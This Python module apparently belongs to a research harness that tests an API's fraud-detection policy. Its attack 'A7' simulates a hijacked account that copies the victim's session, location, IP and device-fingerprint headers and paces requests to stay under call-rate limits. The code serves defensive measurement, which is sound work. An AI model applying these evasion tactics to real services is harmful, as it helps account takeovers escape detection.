"""
A7 — Paced account takeover from a new device (adaptive adversary).

A7 is A4 played by an adversary who reads the defence's own threat model.  §4
already assumes the adversary controls every value they send, so an adversary
who has taken over an account can (i) copy the victim client's self-reported
context headers — session id, geography, source network, device fingerprint —
and (ii) pace their requests below any absolute call-rate threshold.  Neither
capability is new; both are entailed by the stated threat model.

What that leaves is exactly one signal the adversary cannot suppress: the
`cnf.jkt` thumbprint bound into the token Keycloak issued to *their* key, which
the per-subject device registry sees as a key this subject has never used.  A7
therefore measures whether the unforgeable signal is, on its own, actionable at
the shipped operating point.

A7 exists because A4's measured outcome is not what a single success rate
suggests.  In A4 the adversary is caught only while one of two *transient*
signals happens to be firing — session continuity, before the adversary's own
traffic dilutes the victim's baseline past 0.5, and call rate, after the 60 s
window has accumulated more than 30 events.  Between the two, requests score
0.35 from the unknown-device rule alone, which is below the 0.40 challenge
threshold, and are allowed.  A7 removes both transients and leaves the
unforgeable signal by itself.

Expected:
  B1:            vulnerable (as A4 — every FAPI 2.0 check passes)
  P (tau=0.40):  vulnerable — 0.35 < 0.40, so the unknown-device rule alone
                 cannot change a decision
  P (tau=0.30):  blocked — the same evidence, priced above the threshold
"""
from __future__ import annotations

import asyncio
import time

import httpx

from attacks.base import AttackResult, attack_headers, write_attack_result
from client_sim.device import Device

ATTACK_ID = "A7"

# One request every PACE_SECONDS keeps the sliding-window call rate below the
# 30 req/min rule for any window length: 60/2.5 = 24 req/min.
PACE_SECONDS = 2.5


async def run(
    controller_url: str,
    config: str,
    attacker_access_token: str,
    attacker_device: Device,
    mimic_session_id: str,
    mimic_geo: str = "AU",
    mimic_source_ip: str = "10.0.0.1",
    mimic_device_fp: str = "",
    num_attempts: int = 30,
    out_dir: str = "data/raw/attacks_adaptive",
    oracle_tag: bool = False,
    pace_seconds: float = PACE_SECONDS,
) -> AttackResult:
    """
    The adversary holds their own valid, DPoP-bound token for the victim's
    account (as in A4) but mimics the victim's self-reported context and paces
    the request stream.
    """
    result = AttackResult(attack_id=ATTACK_ID, config=config, oracle_tag=oracle_tag)
    result.notes = (f"paced {pace_seconds}s; mimicked session/geo/fp; "
                    f"only cnf.jkt distinguishes the adversary; ")
    t_start = time.perf_counter()

    async with httpx.AsyncClient(base_url=controller_url, timeout=10) as client:
        for idx in range(num_attempts):
            result.attempts += 1
            path = "/accounts"
            full_url = f"{controller_url}{path}"

            headers = {"Authorization": f"Bearer {attacker_access_token}"}
            headers.update(attack_headers(ATTACK_ID, oracle_tag))
            # Context headers copied from the victim's client rather than the
            # adversary's own device: the adversary chooses what they report.
            headers.update(attacker_device.context_headers(
                geo=mimic_geo,
                source_ip=mimic_source_ip,
                device_fp=mimic_device_fp or None,
            ))
            headers["x-session-id"] = mimic_session_id
            if config != "B0":
                headers["DPoP"] = attacker_device.sign_dpop_proof(
                    method="GET",
                    url=full_url,
                    access_token=attacker_access_token,
                )

            try:
                resp = await client.get(path, headers=headers)
                if resp.status_code == 200:
                    result.successes += 1
                else:
                    if not result.detected:
                        result.detected = True
                        result.time_to_detect_ms = (time.perf_counter() - t_start) * 1000
                        result.blocked_at_stage = _infer_stage(resp)
                result.raw_responses.append({"status": resp.status_code})
            except Exception as exc:
                result.notes += f"error: {exc}; "

            if idx < num_attempts - 1:
                await asyncio.sleep(pace_seconds)

    write_attack_result(result, out_dir)
    return result


def _infer_stage(resp) -> str:
    body = resp.text.lower()
    if "step_up" in body or "challenge" in body:
        return "policy:CHALLENGE"
    if resp.status_code == 403:
        return "policy:DENY"
    if resp.status_code == 401:
        return "dpop_verify"
    return "unknown"
